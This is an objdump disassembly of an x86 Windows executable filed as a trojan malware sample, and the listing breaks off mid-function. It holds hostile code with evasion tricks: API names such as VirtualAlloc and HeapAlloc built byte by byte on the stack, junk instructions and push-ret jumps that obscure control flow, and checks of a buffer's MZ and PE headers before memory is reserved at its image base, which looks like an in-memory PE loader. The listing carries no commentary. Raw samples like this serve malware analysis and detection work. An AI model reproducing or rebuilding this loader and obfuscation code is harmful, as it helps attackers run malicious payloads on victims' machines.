
malware_samples/trojan/04795669ada92df9a0361b6e169be7b6c23c888f6a56a96c35bd8cd4c09cd6c9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	40                   	inc    %eax
  401001:	4b                   	dec    %ebx
  401002:	48                   	dec    %eax
  401003:	43                   	inc    %ebx
  401004:	8a c1                	mov    %cl,%al
  401006:	3c 61                	cmp    $0x61,%al
  401008:	7c 06                	jl     0x401010
  40100a:	3c 7a                	cmp    $0x7a,%al
  40100c:	7f 02                	jg     0x401010
  40100e:	24 df                	and    $0xdf,%al
  401010:	c3                   	ret
  401011:	55                   	push   %ebp
  401012:	8b ec                	mov    %esp,%ebp
  401014:	6a ff                	push   $0xffffffff
  401016:	68 80 eb 40 00       	push   $0x40eb80
  40101b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401021:	50                   	push   %eax
  401022:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401029:	51                   	push   %ecx
  40102a:	83 ec 20             	sub    $0x20,%esp
  40102d:	53                   	push   %ebx
  40102e:	56                   	push   %esi
  40102f:	57                   	push   %edi
  401030:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401033:	89 55 d0             	mov    %edx,-0x30(%ebp)
  401036:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  401039:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401040:	b8 01 00 00 00       	mov    $0x1,%eax
  401045:	85 c0                	test   %eax,%eax
  401047:	74 15                	je     0x40105e
  401049:	c7 45 e0 2d 00 00 00 	movl   $0x2d,-0x20(%ebp)
  401050:	68 70 00 41 00       	push   $0x410070
  401055:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401058:	51                   	push   %ecx
  401059:	e8 12 1e 00 00       	call   0x402e70
  40105e:	e9 bb 00 00 00       	jmp    0x40111e
  401063:	40                   	inc    %eax
  401064:	4b                   	dec    %ebx
  401065:	48                   	dec    %eax
  401066:	43                   	inc    %ebx
  401067:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40106e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401071:	03 55 e4             	add    -0x1c(%ebp),%edx
  401074:	8a 0a                	mov    (%edx),%cl
  401076:	e8 85 ff ff ff       	call   0x401000
  40107b:	88 45 ec             	mov    %al,-0x14(%ebp)
  40107e:	90                   	nop
  40107f:	90                   	nop
  401080:	90                   	nop
  401081:	90                   	nop
  401082:	90                   	nop
  401083:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401086:	03 45 e4             	add    -0x1c(%ebp),%eax
  401089:	8a 08                	mov    (%eax),%cl
  40108b:	e8 70 ff ff ff       	call   0x401000
  401090:	88 45 e8             	mov    %al,-0x18(%ebp)
  401093:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401096:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40109c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40109f:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4010a5:	3b d1                	cmp    %ecx,%edx
  4010a7:	7e 19                	jle    0x4010c2
  4010a9:	90                   	nop
  4010aa:	90                   	nop
  4010ab:	90                   	nop
  4010ac:	90                   	nop
  4010ad:	90                   	nop
  4010ae:	90                   	nop
  4010af:	90                   	nop
  4010b0:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  4010b7:	b8 bd 10 40 00       	mov    $0x4010bd,%eax
  4010bc:	c3                   	ret
  4010bd:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4010c0:	eb 65                	jmp    0x401127
  4010c2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4010c5:	25 ff 00 00 00       	and    $0xff,%eax
  4010ca:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4010cd:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4010d3:	3b c8                	cmp    %eax,%ecx
  4010d5:	7d 16                	jge    0x4010ed
  4010d7:	40                   	inc    %eax
  4010d8:	4b                   	dec    %ebx
  4010d9:	48                   	dec    %eax
  4010da:	43                   	inc    %ebx
  4010db:	c7 45 d8 ff ff ff ff 	movl   $0xffffffff,-0x28(%ebp)
  4010e2:	b8 e8 10 40 00       	mov    $0x4010e8,%eax
  4010e7:	c3                   	ret
  4010e8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4010eb:	eb 3a                	jmp    0x401127
  4010ed:	90                   	nop
  4010ee:	90                   	nop
  4010ef:	90                   	nop
  4010f0:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4010f3:	83 c2 01             	add    $0x1,%edx
  4010f6:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4010f9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4010fc:	25 ff 00 00 00       	and    $0xff,%eax
  401101:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401104:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40110a:	0b c8                	or     %eax,%ecx
  40110c:	85 c9                	test   %ecx,%ecx
  40110e:	0f 85 5a ff ff ff    	jne    0x40106e
  401114:	40                   	inc    %eax
  401115:	4b                   	dec    %ebx
  401116:	48                   	dec    %eax
  401117:	43                   	inc    %ebx
  401118:	b8 1e 11 40 00       	mov    $0x40111e,%eax
  40111d:	c3                   	ret
  40111e:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401125:	33 c0                	xor    %eax,%eax
  401127:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40112a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401131:	5f                   	pop    %edi
  401132:	5e                   	pop    %esi
  401133:	5b                   	pop    %ebx
  401134:	8b e5                	mov    %ebp,%esp
  401136:	5d                   	pop    %ebp
  401137:	c3                   	ret
  401138:	55                   	push   %ebp
  401139:	8b ec                	mov    %esp,%ebp
  40113b:	6a ff                	push   $0xffffffff
  40113d:	68 8a eb 40 00       	push   $0x40eb8a
  401142:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401148:	50                   	push   %eax
  401149:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401150:	51                   	push   %ecx
  401151:	83 ec 38             	sub    $0x38,%esp
  401154:	53                   	push   %ebx
  401155:	56                   	push   %esi
  401156:	57                   	push   %edi
  401157:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40115a:	c6 45 d0 48          	movb   $0x48,-0x30(%ebp)
  40115e:	c6 45 d1 65          	movb   $0x65,-0x2f(%ebp)
  401162:	c6 45 d2 61          	movb   $0x61,-0x2e(%ebp)
  401166:	c6 45 d3 70          	movb   $0x70,-0x2d(%ebp)
  40116a:	c6 45 d4 46          	movb   $0x46,-0x2c(%ebp)
  40116e:	c6 45 d5 72          	movb   $0x72,-0x2b(%ebp)
  401172:	c6 45 d6 65          	movb   $0x65,-0x2a(%ebp)
  401176:	c6 45 d7 65          	movb   $0x65,-0x29(%ebp)
  40117a:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  40117e:	c6 45 c0 4b          	movb   $0x4b,-0x40(%ebp)
  401182:	c6 45 c1 45          	movb   $0x45,-0x3f(%ebp)
  401186:	c6 45 c2 52          	movb   $0x52,-0x3e(%ebp)
  40118a:	c6 45 c3 4e          	movb   $0x4e,-0x3d(%ebp)
  40118e:	c6 45 c4 45          	movb   $0x45,-0x3c(%ebp)
  401192:	c6 45 c5 4c          	movb   $0x4c,-0x3b(%ebp)
  401196:	c6 45 c6 33          	movb   $0x33,-0x3a(%ebp)
  40119a:	c6 45 c7 32          	movb   $0x32,-0x39(%ebp)
  40119e:	c6 45 c8 2e          	movb   $0x2e,-0x38(%ebp)
  4011a2:	c6 45 c9 64          	movb   $0x64,-0x37(%ebp)
  4011a6:	c6 45 ca 6c          	movb   $0x6c,-0x36(%ebp)
  4011aa:	c6 45 cb 6c          	movb   $0x6c,-0x35(%ebp)
  4011ae:	c6 45 cc 00          	movb   $0x0,-0x34(%ebp)
  4011b2:	68 c8 ad 45 00       	push   $0x45adc8
  4011b7:	68 d4 ad 45 00       	push   $0x45add4
  4011bc:	ff 15 04 f0 40 00    	call   *0x40f004
  4011c2:	50                   	push   %eax
  4011c3:	ff 15 00 f0 40 00    	call   *0x40f000
  4011c9:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4011cc:	c6 45 e0 47          	movb   $0x47,-0x20(%ebp)
  4011d0:	c6 45 e1 65          	movb   $0x65,-0x1f(%ebp)
  4011d4:	c6 45 e2 74          	movb   $0x74,-0x1e(%ebp)
  4011d8:	c6 45 e3 50          	movb   $0x50,-0x1d(%ebp)
  4011dc:	c6 45 e4 72          	movb   $0x72,-0x1c(%ebp)
  4011e0:	c6 45 e5 6f          	movb   $0x6f,-0x1b(%ebp)
  4011e4:	c6 45 e6 63          	movb   $0x63,-0x1a(%ebp)
  4011e8:	c6 45 e7 65          	movb   $0x65,-0x19(%ebp)
  4011ec:	c6 45 e8 73          	movb   $0x73,-0x18(%ebp)
  4011f0:	c6 45 e9 73          	movb   $0x73,-0x17(%ebp)
  4011f4:	c6 45 ea 48          	movb   $0x48,-0x16(%ebp)
  4011f8:	c6 45 eb 65          	movb   $0x65,-0x15(%ebp)
  4011fc:	c6 45 ec 61          	movb   $0x61,-0x14(%ebp)
  401200:	c6 45 ed 70          	movb   $0x70,-0x13(%ebp)
  401204:	c6 45 ee 00          	movb   $0x0,-0x12(%ebp)
  401208:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40120b:	50                   	push   %eax
  40120c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40120f:	51                   	push   %ecx
  401210:	ff 15 04 f0 40 00    	call   *0x40f004
  401216:	50                   	push   %eax
  401217:	ff 15 00 f0 40 00    	call   *0x40f000
  40121d:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401220:	90                   	nop
  401221:	90                   	nop
  401222:	90                   	nop
  401223:	90                   	nop
  401224:	90                   	nop
  401225:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40122c:	ba 01 00 00 00       	mov    $0x1,%edx
  401231:	85 d2                	test   %edx,%edx
  401233:	74 15                	je     0x40124a
  401235:	c7 45 b8 63 00 00 00 	movl   $0x63,-0x48(%ebp)
  40123c:	68 70 00 41 00       	push   $0x410070
  401241:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401244:	50                   	push   %eax
  401245:	e8 26 1c 00 00       	call   0x402e70
  40124a:	eb 17                	jmp    0x401263
  40124c:	40                   	inc    %eax
  40124d:	4b                   	dec    %ebx
  40124e:	48                   	dec    %eax
  40124f:	43                   	inc    %ebx
  401250:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401253:	51                   	push   %ecx
  401254:	6a 00                	push   $0x0
  401256:	ff 55 dc             	call   *-0x24(%ebp)
  401259:	50                   	push   %eax
  40125a:	ff 55 bc             	call   *-0x44(%ebp)
  40125d:	b8 63 12 40 00       	mov    $0x401263,%eax
  401262:	c3                   	ret
  401263:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40126a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40126d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401274:	5f                   	pop    %edi
  401275:	5e                   	pop    %esi
  401276:	5b                   	pop    %ebx
  401277:	8b e5                	mov    %ebp,%esp
  401279:	5d                   	pop    %ebp
  40127a:	c3                   	ret
  40127b:	55                   	push   %ebp
  40127c:	8b ec                	mov    %esp,%ebp
  40127e:	6a ff                	push   $0xffffffff
  401280:	68 94 eb 40 00       	push   $0x40eb94
  401285:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40128b:	50                   	push   %eax
  40128c:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401293:	51                   	push   %ecx
  401294:	83 ec 50             	sub    $0x50,%esp
  401297:	53                   	push   %ebx
  401298:	56                   	push   %esi
  401299:	57                   	push   %edi
  40129a:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40129d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4012a4:	b8 01 00 00 00       	mov    $0x1,%eax
  4012a9:	85 c0                	test   %eax,%eax
  4012ab:	74 15                	je     0x4012c2
  4012ad:	c7 45 a8 55 00 00 00 	movl   $0x55,-0x58(%ebp)
  4012b4:	68 70 00 41 00       	push   $0x410070
  4012b9:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4012bc:	51                   	push   %ecx
  4012bd:	e8 ae 1b 00 00       	call   0x402e70
  4012c2:	e9 68 01 00 00       	jmp    0x40142f
  4012c7:	c6 45 cc 4b          	movb   $0x4b,-0x34(%ebp)
  4012cb:	c6 45 cd 45          	movb   $0x45,-0x33(%ebp)
  4012cf:	c6 45 ce 52          	movb   $0x52,-0x32(%ebp)
  4012d3:	c6 45 cf 4e          	movb   $0x4e,-0x31(%ebp)
  4012d7:	c6 45 d0 45          	movb   $0x45,-0x30(%ebp)
  4012db:	c6 45 d1 4c          	movb   $0x4c,-0x2f(%ebp)
  4012df:	c6 45 d2 33          	movb   $0x33,-0x2e(%ebp)
  4012e3:	c6 45 d3 32          	movb   $0x32,-0x2d(%ebp)
  4012e7:	c6 45 d4 2e          	movb   $0x2e,-0x2c(%ebp)
  4012eb:	c6 45 d5 64          	movb   $0x64,-0x2b(%ebp)
  4012ef:	c6 45 d6 6c          	movb   $0x6c,-0x2a(%ebp)
  4012f3:	c6 45 d7 6c          	movb   $0x6c,-0x29(%ebp)
  4012f7:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4012fb:	c6 45 ac 48          	movb   $0x48,-0x54(%ebp)
  4012ff:	c6 45 ad 65          	movb   $0x65,-0x53(%ebp)
  401303:	c6 45 ae 61          	movb   $0x61,-0x52(%ebp)
  401307:	c6 45 af 70          	movb   $0x70,-0x51(%ebp)
  40130b:	c6 45 b0 52          	movb   $0x52,-0x50(%ebp)
  40130f:	c6 45 b1 65          	movb   $0x65,-0x4f(%ebp)
  401313:	c6 45 b2 41          	movb   $0x41,-0x4e(%ebp)
  401317:	c6 45 b3 6c          	movb   $0x6c,-0x4d(%ebp)
  40131b:	c6 45 b4 6c          	movb   $0x6c,-0x4c(%ebp)
  40131f:	c6 45 b5 6f          	movb   $0x6f,-0x4b(%ebp)
  401323:	c6 45 b6 63          	movb   $0x63,-0x4a(%ebp)
  401327:	c6 45 b7 00          	movb   $0x0,-0x49(%ebp)
  40132b:	68 e4 ad 45 00       	push   $0x45ade4
  401330:	68 f0 ad 45 00       	push   $0x45adf0
  401335:	ff 15 04 f0 40 00    	call   *0x40f004
  40133b:	50                   	push   %eax
  40133c:	ff 15 00 f0 40 00    	call   *0x40f000
  401342:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401345:	c6 45 b8 48          	movb   $0x48,-0x48(%ebp)
  401349:	c6 45 b9 65          	movb   $0x65,-0x47(%ebp)
  40134d:	c6 45 ba 61          	movb   $0x61,-0x46(%ebp)
  401351:	c6 45 bb 70          	movb   $0x70,-0x45(%ebp)
  401355:	c6 45 bc 41          	movb   $0x41,-0x44(%ebp)
  401359:	c6 45 bd 6c          	movb   $0x6c,-0x43(%ebp)
  40135d:	c6 45 be 6c          	movb   $0x6c,-0x42(%ebp)
  401361:	c6 45 bf 6f          	movb   $0x6f,-0x41(%ebp)
  401365:	c6 45 c0 63          	movb   $0x63,-0x40(%ebp)
  401369:	c6 45 c1 00          	movb   $0x0,-0x3f(%ebp)
  40136d:	68 00 ae 45 00       	push   $0x45ae00
  401372:	68 0c ae 45 00       	push   $0x45ae0c
  401377:	ff 15 04 f0 40 00    	call   *0x40f004
  40137d:	50                   	push   %eax
  40137e:	ff 15 00 f0 40 00    	call   *0x40f000
  401384:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401387:	90                   	nop
  401388:	90                   	nop
  401389:	90                   	nop
  40138a:	90                   	nop
  40138b:	40                   	inc    %eax
  40138c:	4b                   	dec    %ebx
  40138d:	48                   	dec    %eax
  40138e:	43                   	inc    %ebx
  40138f:	c6 45 e0 47          	movb   $0x47,-0x20(%ebp)
  401393:	c6 45 e1 65          	movb   $0x65,-0x1f(%ebp)
  401397:	c6 45 e2 74          	movb   $0x74,-0x1e(%ebp)
  40139b:	c6 45 e3 50          	movb   $0x50,-0x1d(%ebp)
  40139f:	c6 45 e4 72          	movb   $0x72,-0x1c(%ebp)
  4013a3:	c6 45 e5 6f          	movb   $0x6f,-0x1b(%ebp)
  4013a7:	c6 45 e6 63          	movb   $0x63,-0x1a(%ebp)
  4013ab:	c6 45 e7 65          	movb   $0x65,-0x19(%ebp)
  4013af:	c6 45 e8 73          	movb   $0x73,-0x18(%ebp)
  4013b3:	c6 45 e9 73          	movb   $0x73,-0x17(%ebp)
  4013b7:	c6 45 ea 48          	movb   $0x48,-0x16(%ebp)
  4013bb:	c6 45 eb 65          	movb   $0x65,-0x15(%ebp)
  4013bf:	c6 45 ec 61          	movb   $0x61,-0x14(%ebp)
  4013c3:	c6 45 ed 70          	movb   $0x70,-0x13(%ebp)
  4013c7:	c6 45 ee 00          	movb   $0x0,-0x12(%ebp)
  4013cb:	68 1c ae 45 00       	push   $0x45ae1c
  4013d0:	68 2c ae 45 00       	push   $0x45ae2c
  4013d5:	ff 15 04 f0 40 00    	call   *0x40f004
  4013db:	50                   	push   %eax
  4013dc:	ff 15 00 f0 40 00    	call   *0x40f000
  4013e2:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4013e5:	90                   	nop
  4013e6:	90                   	nop
  4013e7:	90                   	nop
  4013e8:	90                   	nop
  4013e9:	90                   	nop
  4013ea:	90                   	nop
  4013eb:	90                   	nop
  4013ec:	90                   	nop
  4013ed:	90                   	nop
  4013ee:	90                   	nop
  4013ef:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4013f3:	74 1f                	je     0x401414
  4013f5:	8b 55 0c             	mov    0xc(%ebp),%edx
  4013f8:	52                   	push   %edx
  4013f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4013fc:	50                   	push   %eax
  4013fd:	6a 00                	push   $0x0
  4013ff:	ff 55 c8             	call   *-0x38(%ebp)
  401402:	50                   	push   %eax
  401403:	ff 55 c4             	call   *-0x3c(%ebp)
  401406:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  401409:	b8 0f 14 40 00       	mov    $0x40140f,%eax
  40140e:	c3                   	ret
  40140f:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  401412:	eb 22                	jmp    0x401436
  401414:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401417:	51                   	push   %ecx
  401418:	6a 00                	push   $0x0
  40141a:	ff 55 c8             	call   *-0x38(%ebp)
  40141d:	50                   	push   %eax
  40141e:	ff 55 dc             	call   *-0x24(%ebp)
  401421:	89 45 a0             	mov    %eax,-0x60(%ebp)
  401424:	b8 2a 14 40 00       	mov    $0x40142a,%eax
  401429:	c3                   	ret
  40142a:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40142d:	eb 07                	jmp    0x401436
  40142f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401436:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401439:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401440:	5f                   	pop    %edi
  401441:	5e                   	pop    %esi
  401442:	5b                   	pop    %ebx
  401443:	8b e5                	mov    %ebp,%esp
  401445:	5d                   	pop    %ebp
  401446:	c3                   	ret
  401447:	55                   	push   %ebp
  401448:	8b ec                	mov    %esp,%ebp
  40144a:	6a ff                	push   $0xffffffff
  40144c:	68 9e eb 40 00       	push   $0x40eb9e
  401451:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401457:	50                   	push   %eax
  401458:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40145f:	51                   	push   %ecx
  401460:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  401466:	53                   	push   %ebx
  401467:	56                   	push   %esi
  401468:	57                   	push   %edi
  401469:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40146c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401473:	b8 01 00 00 00       	mov    $0x1,%eax
  401478:	85 c0                	test   %eax,%eax
  40147a:	74 1b                	je     0x401497
  40147c:	c7 85 74 ff ff ff 30 	movl   $0x30,-0x8c(%ebp)
  401483:	00 00 00 
  401486:	68 70 00 41 00       	push   $0x410070
  40148b:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  401491:	51                   	push   %ecx
  401492:	e8 d9 19 00 00       	call   0x402e70
  401497:	e9 e7 03 00 00       	jmp    0x401883
  40149c:	c6 45 b8 4b          	movb   $0x4b,-0x48(%ebp)
  4014a0:	c6 45 b9 45          	movb   $0x45,-0x47(%ebp)
  4014a4:	c6 45 ba 52          	movb   $0x52,-0x46(%ebp)
  4014a8:	c6 45 bb 4e          	movb   $0x4e,-0x45(%ebp)
  4014ac:	c6 45 bc 45          	movb   $0x45,-0x44(%ebp)
  4014b0:	c6 45 bd 4c          	movb   $0x4c,-0x43(%ebp)
  4014b4:	c6 45 be 33          	movb   $0x33,-0x42(%ebp)
  4014b8:	c6 45 bf 32          	movb   $0x32,-0x41(%ebp)
  4014bc:	c6 45 c0 2e          	movb   $0x2e,-0x40(%ebp)
  4014c0:	c6 45 c1 64          	movb   $0x64,-0x3f(%ebp)
  4014c4:	c6 45 c2 6c          	movb   $0x6c,-0x3e(%ebp)
  4014c8:	c6 45 c3 6c          	movb   $0x6c,-0x3d(%ebp)
  4014cc:	c6 45 c4 00          	movb   $0x0,-0x3c(%ebp)
  4014d0:	c6 45 94 48          	movb   $0x48,-0x6c(%ebp)
  4014d4:	c6 45 95 65          	movb   $0x65,-0x6b(%ebp)
  4014d8:	c6 45 96 61          	movb   $0x61,-0x6a(%ebp)
  4014dc:	c6 45 97 70          	movb   $0x70,-0x69(%ebp)
  4014e0:	c6 45 98 41          	movb   $0x41,-0x68(%ebp)
  4014e4:	c6 45 99 6c          	movb   $0x6c,-0x67(%ebp)
  4014e8:	c6 45 9a 6c          	movb   $0x6c,-0x66(%ebp)
  4014ec:	c6 45 9b 6f          	movb   $0x6f,-0x65(%ebp)
  4014f0:	c6 45 9c 63          	movb   $0x63,-0x64(%ebp)
  4014f4:	c6 45 9d 00          	movb   $0x0,-0x63(%ebp)
  4014f8:	68 3c ae 45 00       	push   $0x45ae3c
  4014fd:	68 48 ae 45 00       	push   $0x45ae48
  401502:	ff 15 04 f0 40 00    	call   *0x40f004
  401508:	50                   	push   %eax
  401509:	ff 15 00 f0 40 00    	call   *0x40f000
  40150f:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401512:	90                   	nop
  401513:	90                   	nop
  401514:	90                   	nop
  401515:	90                   	nop
  401516:	90                   	nop
  401517:	90                   	nop
  401518:	90                   	nop
  401519:	90                   	nop
  40151a:	c6 85 7c ff ff ff 4b 	movb   $0x4b,-0x84(%ebp)
  401521:	c6 85 7d ff ff ff 45 	movb   $0x45,-0x83(%ebp)
  401528:	c6 85 7e ff ff ff 52 	movb   $0x52,-0x82(%ebp)
  40152f:	c6 85 7f ff ff ff 4e 	movb   $0x4e,-0x81(%ebp)
  401536:	c6 45 80 45          	movb   $0x45,-0x80(%ebp)
  40153a:	c6 45 81 4c          	movb   $0x4c,-0x7f(%ebp)
  40153e:	c6 45 82 33          	movb   $0x33,-0x7e(%ebp)
  401542:	c6 45 83 32          	movb   $0x32,-0x7d(%ebp)
  401546:	c6 45 84 2e          	movb   $0x2e,-0x7c(%ebp)
  40154a:	c6 45 85 64          	movb   $0x64,-0x7b(%ebp)
  40154e:	c6 45 86 6c          	movb   $0x6c,-0x7a(%ebp)
  401552:	c6 45 87 6c          	movb   $0x6c,-0x79(%ebp)
  401556:	c6 45 88 00          	movb   $0x0,-0x78(%ebp)
  40155a:	c6 45 a0 56          	movb   $0x56,-0x60(%ebp)
  40155e:	c6 45 a1 69          	movb   $0x69,-0x5f(%ebp)
  401562:	c6 45 a2 72          	movb   $0x72,-0x5e(%ebp)
  401566:	c6 45 a3 74          	movb   $0x74,-0x5d(%ebp)
  40156a:	c6 45 a4 75          	movb   $0x75,-0x5c(%ebp)
  40156e:	c6 45 a5 61          	movb   $0x61,-0x5b(%ebp)
  401572:	c6 45 a6 6c          	movb   $0x6c,-0x5a(%ebp)
  401576:	c6 45 a7 41          	movb   $0x41,-0x59(%ebp)
  40157a:	c6 45 a8 6c          	movb   $0x6c,-0x58(%ebp)
  40157e:	c6 45 a9 6c          	movb   $0x6c,-0x57(%ebp)
  401582:	c6 45 aa 6f          	movb   $0x6f,-0x56(%ebp)
  401586:	c6 45 ab 63          	movb   $0x63,-0x55(%ebp)
  40158a:	c6 45 ac 00          	movb   $0x0,-0x54(%ebp)
  40158e:	68 58 ae 45 00       	push   $0x45ae58
  401593:	68 68 ae 45 00       	push   $0x45ae68
  401598:	ff 15 04 f0 40 00    	call   *0x40f004
  40159e:	50                   	push   %eax
  40159f:	ff 15 00 f0 40 00    	call   *0x40f000
  4015a5:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4015a8:	40                   	inc    %eax
  4015a9:	4b                   	dec    %ebx
  4015aa:	48                   	dec    %eax
  4015ab:	43                   	inc    %ebx
  4015ac:	c6 45 d8 47          	movb   $0x47,-0x28(%ebp)
  4015b0:	c6 45 d9 65          	movb   $0x65,-0x27(%ebp)
  4015b4:	c6 45 da 74          	movb   $0x74,-0x26(%ebp)
  4015b8:	c6 45 db 50          	movb   $0x50,-0x25(%ebp)
  4015bc:	c6 45 dc 72          	movb   $0x72,-0x24(%ebp)
  4015c0:	c6 45 dd 6f          	movb   $0x6f,-0x23(%ebp)
  4015c4:	c6 45 de 63          	movb   $0x63,-0x22(%ebp)
  4015c8:	c6 45 df 65          	movb   $0x65,-0x21(%ebp)
  4015cc:	c6 45 e0 73          	movb   $0x73,-0x20(%ebp)
  4015d0:	c6 45 e1 73          	movb   $0x73,-0x1f(%ebp)
  4015d4:	c6 45 e2 48          	movb   $0x48,-0x1e(%ebp)
  4015d8:	c6 45 e3 65          	movb   $0x65,-0x1d(%ebp)
  4015dc:	c6 45 e4 61          	movb   $0x61,-0x1c(%ebp)
  4015e0:	c6 45 e5 70          	movb   $0x70,-0x1b(%ebp)
  4015e4:	c6 45 e6 00          	movb   $0x0,-0x1a(%ebp)
  4015e8:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4015eb:	52                   	push   %edx
  4015ec:	68 78 ae 45 00       	push   $0x45ae78
  4015f1:	ff 15 04 f0 40 00    	call   *0x40f004
  4015f7:	50                   	push   %eax
  4015f8:	ff 15 00 f0 40 00    	call   *0x40f000
  4015fe:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401601:	90                   	nop
  401602:	90                   	nop
  401603:	90                   	nop
  401604:	90                   	nop
  401605:	90                   	nop
  401606:	90                   	nop
  401607:	90                   	nop
  401608:	90                   	nop
  401609:	90                   	nop
  40160a:	90                   	nop
  40160b:	90                   	nop
  40160c:	90                   	nop
  40160d:	90                   	nop
  40160e:	90                   	nop
  40160f:	8b 45 08             	mov    0x8(%ebp),%eax
  401612:	89 45 b0             	mov    %eax,-0x50(%ebp)
  401615:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  401618:	33 d2                	xor    %edx,%edx
  40161a:	66 8b 11             	mov    (%ecx),%dx
  40161d:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
  401623:	74 1f                	je     0x401644
  401625:	40                   	inc    %eax
  401626:	4b                   	dec    %ebx
  401627:	48                   	dec    %eax
  401628:	43                   	inc    %ebx
  401629:	c7 85 70 ff ff ff 00 	movl   $0x0,-0x90(%ebp)
  401630:	00 00 00 
  401633:	b8 39 16 40 00       	mov    $0x401639,%eax
  401638:	c3                   	ret
  401639:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  40163f:	e9 48 02 00 00       	jmp    0x40188c
  401644:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401647:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40164a:	03 48 3c             	add    0x3c(%eax),%ecx
  40164d:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  401650:	8b 55 d0             	mov    -0x30(%ebp),%edx
  401653:	81 3a 50 45 00 00    	cmpl   $0x4550,(%edx)
  401659:	74 1b                	je     0x401676
  40165b:	c7 85 6c ff ff ff 00 	movl   $0x0,-0x94(%ebp)
  401662:	00 00 00 
  401665:	b8 6b 16 40 00       	mov    $0x40166b,%eax
  40166a:	c3                   	ret
  40166b:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401671:	e9 16 02 00 00       	jmp    0x40188c
  401676:	40                   	inc    %eax
  401677:	4b                   	dec    %ebx
  401678:	48                   	dec    %eax
  401679:	43                   	inc    %ebx
  40167a:	6a 04                	push   $0x4
  40167c:	68 00 20 00 00       	push   $0x2000
  401681:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401684:	8b 48 50             	mov    0x50(%eax),%ecx
  401687:	51                   	push   %ecx
  401688:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40168b:	8b 42 34             	mov    0x34(%edx),%eax
  40168e:	50                   	push   %eax
  40168f:	ff 15 08 f0 40 00    	call   *0x40f008
  401695:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40169b:	83 bd 78 ff ff ff 00 	cmpl   $0x0,-0x88(%ebp)
  4016a2:	75 1c                	jne    0x4016c0
  4016a4:	6a 04                	push   $0x4
  4016a6:	68 00 20 00 00       	push   $0x2000
  4016ab:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4016ae:	8b 51 50             	mov    0x50(%ecx),%edx
